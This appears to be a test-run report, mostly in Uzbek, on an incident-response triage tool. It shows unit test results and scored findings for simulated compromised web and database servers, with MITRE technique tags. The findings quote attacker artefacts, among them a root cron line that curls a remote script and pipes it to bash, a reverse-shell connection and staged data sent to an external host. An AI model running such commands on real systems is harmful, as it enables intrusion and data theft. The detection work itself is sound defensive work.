# Triage Exfil Report

## 1. Unit Test Results
```
> python -m unittest discover -s tests
.............s.s.s.s..................................................s........................................................................................................................................................................................................................................................................................
----------------------------------------------------------------------
Ran 322 tests in 50.183s

OK (skipped=5)
```

## 2. Web Prod 01
`python bk.py resp triage tests/fixtures/snap_web-prod-01.json --baseline tests/fixtures/base_web-prod-01.json`
```
Score | Conf | Category            | Item                                                                | Techniques                | Protected | Log | Reasons                                                                                     
------+------+---------------------+---------------------------------------------------------------------+---------------------------+-----------+-----+---------------------------------------------------------------------------------------------
0.85  | high | process             | agent.sh (pid 4471) /tmp/.cache/agent.sh                            |                           | False     |     | shubhali joydan ishga tushgan                                                               
0.85  | high | file                | /var/www/html/api/v1/uploads/avatar_8f3a.php                        | T1505.003                 | False     |     | webshell belgisi                                                                            
0.8   | high | cron                | */15 * * * * curl http://198.51.100.45/agent.sh | bash (user: root) | T1105,T1053.003           | False     |     | baseline'da yo'q (yangi),KB heuristika (T1105),shubhali cron buyrug'i                       
0.8   | high | cron                | @reboot /tmp/.cache/agent.sh (user: www-data)                       | T1053.003                 | False     |     | baseline'da yo'q (yangi),shubhali papka,yaqinda o'zgartirilgan,shubhali cron buyrug'i       
0.8   | high | ssh_authorized_keys | ssh-rsa …BgQDattacker backup@198.51.100.45 (user: backup_daemon)    | T1098.004                 | False     |     | baseline'da yo'q (yangi),yangi ssh kalit                                                    
0.8   | high | suid_files          | /tmp/.cache/rootsh                                                  | T1548.001                 | False     |     | baseline'da yo'q (yangi),shubhali papka,yaqinda o'zgartirilgan,shubhali SUID fayl joylashuvi
0.8   | high | process             | python3 (pid 4402) /usr/bin/python3.10                              | T1059.004                 | False     |     | shubhali buyruq (teskari qobiq / dropper)                                                   
0.8   | high | connections         | 198.51.100.45:4444 (python3)                                        | T1059.004,T1071.001       | False     |     | shubhali jarayon ulanishi                                                                   
0.8   | high | file                | /tmp/vault_chunk* (15 ta bo'lak, jami 80 MB)                        | T1074.001,T1030,T1560.001 | False     |     | bo'laklangan staging guruhi                                                                 
0.8   | high | file                | /tmp/.cache/rootsh                                                  |                           | False     |     | shubhali joyda exec fayl                                                                    
0.75  | high | process             | curl (pid 5120) /usr/bin/curl                                       | T1041                     | False     |     | tashqi manzilga fayl yuklash                                                                
0.75  | high | connections         | 203.0.113.88:443 (curl)                                             | T1041,T1071.001           | False     |     | shubhali jarayon ulanishi                                                                   
0.75  | high | file                | /tmp/stolen_id_rsa                                                  | T1552.004                 | False     |     | private key .ssh dan tashqarida                                                             
0.65  | high | users               | backup_daemon                                                       | T1078.003                 | False     |     | baseline'da yo'q (yangi),admin akkaunt,yangi admin akkaunt                                  
0.6   | med  | file                | /tmp/vault.tar.gz                                                   | T1560.001,T1074.001       | False     |     | staging papkada katta arxiv                                                                 
```

## 3. DB Prod 02
`python bk.py resp triage tests/fixtures/snap_db-prod-02.json --baseline tests/fixtures/base_db-prod-02.json`
```
Score | Conf | Category            | Item                                                  | Techniques      | Protected | Log | Reasons                                               
------+------+---------------------+-------------------------------------------------------+-----------------+-----------+-----+-------------------------------------------------------
0.8   | high | ssh_authorized_keys | ssh-rsa …AABgQDstolen root@web-prod-01 (user: root)   | T1098.004       | False     |     | baseline'da yo'q (yangi),yangi ssh kalit              
0.7   | high | process             | pg_dump (pid 6188) /usr/lib/postgresql/14/bin/pg_dump | T1005           | False     |     | DB dump buyrug'i interaktiv qobiqdan / staging papkaga
0.7   | high | file                | /tmp/pg_customer.dump                                 | T1005,T1074.001 | False     |     | staging papkada DB dampi                              
0.7   | high | file                | /tmp/pg_payment.dump                                  | T1005,T1074.001 | False     |     | staging papkada DB dampi                              
```

## 4. Base against Base
`python bk.py resp triage tests/fixtures/base_web-prod-01.json --baseline tests/fixtures/base_web-prod-01.json`
```
(0 topilma)
```

## 5. Qator soni
- `triage.py` joriy qatorlar soni: 1727 qator. 
- O'chirilgan funksiya yo'qligi (`grep -c "^def "`): 8 ta funksiya.

## 6. bk.py ta'siri
`bk.py` fayli o'zgarmagan (950 qator) va unga tegilmagan. Qoidalar muvaffaqiyatli qondirilgan.
